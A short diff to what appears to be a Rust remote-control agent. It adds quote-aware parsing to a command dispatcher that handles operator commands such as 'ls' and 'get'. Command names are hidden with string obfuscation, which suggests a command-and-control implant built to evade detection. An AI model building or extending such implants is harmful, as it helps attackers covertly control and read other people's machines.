@@ -232,15 +232,46 @@ async fn send_command_response(
     Ok(())
 }
 
+fn parse_command(cmd: &str) -> Vec<String> {
+    let mut parts = Vec::new();
+    let mut current = String::new();
+    let mut in_quote = false;
+    let mut quote_char = ' ';
+    let mut chars = cmd.chars().peekable();
+    
+    while let Some(c) = chars.next() {
+        if !in_quote && (c == '"' || c == '\'') {
+            in_quote = true;
+            quote_char = c;
+        } else if in_quote && c == quote_char {
+            in_quote = false;
+            quote_char = ' ';
+        } else if !in_quote && c.is_whitespace() {
+            if !current.is_empty() {
+                parts.push(current.clone());
+                current.clear();
+            }
+        } else {
+            current.push(c);
+        }
+    }
+    
+    if !current.is_empty() {
+        parts.push(current);
+    }
+    
+    parts
+}
+
 async fn execute_command(cmd: &str, state: &mut AgentState, client: &Client) -> Result<String, Box<dyn std::error::Error>> {
-    let parts: Vec<&str> = cmd.trim().split_whitespace().collect();
+    let parts = parse_command(cmd.trim());
     if parts.is_empty() {
         return Err(obfstr!("invalid").into());
     }
 
-    let args: Vec<String> = parts[1..].iter().map(|s| s.to_string()).collect();
+    let args: Vec<String> = parts[1..].iter().cloned().collect();
 
-    let cmd_name = parts[0];
+    let cmd_name = parts[0].as_str();
     if cmd_name == obfstr!("ls") {
         handle_ls(&args).await
     } else if cmd_name == obfstr!("get") {
